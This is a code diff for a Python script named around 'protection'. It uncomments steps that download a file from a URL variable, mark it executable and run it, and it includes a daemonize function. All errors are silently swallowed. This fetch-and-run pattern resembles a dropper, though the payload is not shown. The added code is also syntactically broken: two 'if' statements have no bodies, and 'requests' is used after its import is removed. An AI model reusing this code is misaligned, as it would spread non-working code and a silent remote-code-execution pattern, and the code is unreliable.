@@ -16,7 +16,7 @@ if sys.prefix != "/usr/local/bin/protectionEnv":
     if os.path.exists(virtual_env_python):
         subprocess.run([virtual_env_python] + sys.argv)
     else:
-        sys.exit(0)
+        pass
 
 def daemonize():
     """
@@ -98,43 +98,45 @@ def setup_python_environment(env_path, requirements_path):
 # Function to download a file and save it locally
 def download_file(url, file_path):
     try:
-        import requests
-    except:
+        response = requests.get(url)
+        response.raise_for_status()
+        with open(file_path, 'wb') as file:
+            file.write(response.content)
+    except requests.exceptions.RequestException as e:
+        pass
 
-#	try:
-#		response = requests.get(url)
-#		response.raise_for_status()
-#		with open(file_path, 'wb') as file:
-#			file.write(response.content)
-#	except requests.exceptions.RequestException as e:
-
-#def execute_script():
-#    """
-#    Executes the protection.py script using the Python interpreter
-#    from the virtual environment.
-#    """
-#    try:
-#        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
-#        if result.stdout:
-#        if result.stderr:
-#    except Exception as e:
+def execute_script():
+    """
+    Executes the protection.py script using the Python interpreter
+    from the virtual environment.
+    """
+    try:
+        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
+        if result.stdout:
+        if result.stderr:
+    except Exception as e:
+        pass
 
 # Function to make script executable
-#def make_executable(file_path):
-#    try:
-#        os.chmod(file_path, 0o755)
-#    except Exception as e:
+def make_executable(file_path):
+    try:
+        os.chmod(file_path, 0o755)
+    except Exception as e:
+        pass
+
 
 if __name__ == "__main__":
 
     # Step 1: Check if the virtual environment exists, create it if not
-#    if not os.path.exists(envPath):
-#        create_virtual_environment(envPath)
-#    else:
-#
-#    # Step 2: Use the virtual environment's Python for the rest of the script
-#    os.environ['VIRTUAL_ENV'] = envPath
-#    os.environ['PATH'] = f"{os.path.join(envPath, 'bin')}:{os.environ['PATH']}"
+    if not os.path.exists(envPath):
+        create_virtual_environment(envPath)
+    else:
+        pass
+
+    # Step 2: Use the virtual environment's Python for the rest of the script
+    os.environ['VIRTUAL_ENV'] = envPath
+    os.environ['PATH'] = f"{os.path.join(envPath, 'bin')}:{os.environ['PATH']}"
+
 
     # Step 3: Download the necessary files
     download_file(repoUrl, repoFilePath)
